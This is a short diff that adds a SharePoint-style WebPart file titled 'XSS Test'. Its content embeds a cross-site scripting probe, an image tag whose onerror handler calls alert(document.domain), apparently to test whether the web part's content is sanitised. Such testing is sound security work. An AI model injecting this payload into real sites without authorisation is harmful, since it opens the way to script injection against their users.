@@ -1,0 +1,6 @@
+<WebPart xmlns="http://schemas.microsoft.com/WebPart/v2">
+  <Title>XSS Test</Title>
+  <Content><![CDATA[
+    <img src=x onerror=alert(document.domain)>
+  ]]></Content>
+</WebPart>
